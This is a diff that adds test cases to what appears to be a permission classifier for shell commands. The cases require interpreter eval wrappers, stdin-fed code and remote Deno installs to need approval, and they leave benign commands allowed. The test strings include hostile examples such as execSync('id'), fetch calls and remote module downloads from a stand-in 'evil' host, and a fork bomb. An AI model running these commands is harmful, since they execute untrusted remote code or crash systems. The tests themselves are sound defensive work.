@@ -76,6 +76,17 @@ must("env NODE_OPTIONS wrapper", `env NODE_OPTIONS='--require ./evil.js' node ap
 must("env VAR node -r (re-classified)", `env FOO=bar node -r ./evil.js app.js`, ["ask"]);
 must("env -i wrapper node -e", `env -i node -e 'require("fs")'`, ["ask"]);
 must("env -S wrapper node -e", `env -S node -e 'x'`, ["ask"]);
+must("tsx -e eval", `tsx -e 'require("child_process").execSync("id")'`, ["ask"]);
+must("tsx --eval", `tsx --eval 'fetch("http://evil")'`, ["ask"]);
+must("time wrapper node -e", `time node -e 'require("child_process").execSync("id")'`, ["ask"]);
+must("nice wrapper node -e", `nice node -e 'x'`, ["ask"]);
+must("command wrapper node -e", `command node -e 'x'`, ["ask"]);
+must("time env combo node -e", `time env X=1 node -e 'x'`, ["ask"]);
+must("node <<< stdin code", `node <<< "require('os').networkInterfaces()"`, ["ask"]);
+must("node < file stdin code", `node < ./payload.js`, ["ask"]);
+must("deno compile remote", `deno compile --allow-all https://evil.example/mod.ts`, ["ask"]);
+must("deno install remote", `deno install --allow-all -n tool https://evil.example/mod.ts`, ["ask"]);
+must("bun -e0 attached", `bun -e0`, ["ask"]);
 
 console.log("── F1b regression: benign node flags still allow ──");
 must("node script", `node server.js`, ALLOW);
@@ -98,6 +109,11 @@ must("env VAR benign node", `env NODE_ENV=production node app.js`, ALLOW);
 must("env VAR benign npm", `env DEBUG=1 npm test`, ALLOW);
 must("env bare", `env`, ALLOW);
 must("env -i benign node", `env -i node app.js`, ALLOW);
+must("time npm test", `time npm test`, ALLOW);
+must("nice node server", `nice node server.js`, ALLOW);
+must("node script stdin data", `node app.js < input.txt`, ALLOW);
+must("deno compile local", `deno compile ./local.ts`, ALLOW);
+must("tsx run file", `tsx ./app.ts`, ALLOW);
 
 console.log("── F4: fork bomb is denied (was dead code) ──");
 must("fork bomb", `:(){ :|:& };:`, DENY);
